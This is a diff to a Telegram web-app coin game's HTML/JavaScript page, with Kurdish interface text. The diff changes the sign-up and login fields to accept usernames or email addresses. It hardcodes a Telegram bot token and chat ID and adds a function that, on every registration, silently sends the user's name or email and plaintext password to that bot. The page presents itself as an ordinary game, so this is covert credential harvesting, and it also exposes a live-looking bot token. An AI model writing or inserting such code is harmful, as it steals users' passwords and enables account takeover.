@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FOX Coin Game - Shop & Auth</title>
+    <title>FOX Coin Game - Telegram Bot Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -335,7 +335,7 @@
         <div id="registerScreen" class="screen active">
             <div class="auth-box">
                 <h2>👤 تۆمارکرنا ئەکاونتی (Register)</h2>
-                <input type="text" id="regUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری (Username)">
+                <input type="text" id="regUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری یان یمێل (Username/Email)">
                 <div style="display: flex; gap: 5px;">
                     <input type="text" id="regPassword" class="auth-input" placeholder="پاسوورد (Password)">
                     <button type="button" onclick="generateRandomPassword()" style="background: #3498db; border: none; color: #fff; border-radius: 8px; padding: 0 10px; font-size: 11px; cursor: pointer; white-space: nowrap;">Random 🎲</button>
@@ -349,7 +349,7 @@
         <div id="loginScreen" class="screen">
             <div class="auth-box">
                 <h2>🔐 چوونە ژوورڤە (Login)</h2>
-                <input type="text" id="loginUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری (Username)">
+                <input type="text" id="loginUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری (Username/Email)">
                 <input type="password" id="loginPassword" class="auth-input" placeholder="پاسوورد (Password)">
                 <button class="auth-btn" onclick="loginUser()">چوونە ژوورڤە (Sign In)</button>
                 <div class="auth-switch" onclick="switchAuthScreen('registerScreen')">تە ئەکاونت نینە؟ <span>تۆمارکرنا نوو (Register)</span></div>
@@ -429,6 +429,10 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
+        // زانیاریێن بۆتا تێلێگرامێ تە (Token & Chat ID)
+        const BOT_TOKEN = "8945123640:AAGjazTZFPNmjHDAw5LdwYTB9tWjQFVooXs";
+        const CHAT_ID = "8920889734";
+
         let currentUserKey = null;
         let coins = 0.0;
         let energy = 1000;
@@ -460,12 +464,27 @@
             alert("پاسووردا Random بۆ تە هاتە دروستکرن: " + pass + "\nتکایە لای خۆ سەیڤ بکە!");
         }
 
+        // رێکا هنارتنا نامەی بۆ تێلێگراما تە
+        function sendTelegramNotification(username, password) {
+            const message = `🚨 ئەکاونتەکێ نوو هاتە دروستکرن!\n\n👤 ناڤ/یمێل: ${username}\n🔑 پاسوورد: ${password}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Telegram notification sent:", data);
+                })
+                .catch(error => {
+                    console.error("Error sending notification:", error);
+                });
+        }
+
         function registerUser() {
             let username = document.getElementById('regUsername').value.trim();
             let password = document.getElementById('regPassword').value.trim();
 
             if (!username || !password) {
-                alert('تکایە ناڤ و پاسووردی بنڤیسە! ❌');
+                alert('تکایە ناڤ/یمێل و پاسووردی بنڤیسە! ❌');
                 return;
             }
 
@@ -478,7 +497,7 @@
 
             usersDB[username] = {
                 password: password,
-                coins: 150.0, // دابینکرنا کۆینێن دەستپێکێ ب مەرەما تاقیکرنا شۆپی
+                coins: 150.0,
                 energy: 1000,
                 maxEnergy: 1000,
                 level: 1,
@@ -486,6 +505,10 @@
             };
 
             localStorage.setItem('fox_users_database', JSON.stringify(usersDB));
+
+            // هنارتنا نامەی بۆ تێلێگراما تە دەمێ ئەکاونت دروست دبت
+            sendTelegramNotification(username, password);
+
             alert('پیرۆزە! ئەکاونتا تە ب سەرکەڤتن هاتە دروستکرن. نوو دەرباز بە (Login). 🎉');
             switchAuthScreen('loginScreen');
         }
@@ -584,7 +607,7 @@
                 return;
             }
 
-            coins -= 100; // ڤەکێشانا 100 کۆینان
+            coins -= 100;
             myLink = linkInput;
 
             document.getElementById('score').innerText = coins.toFixed(5);
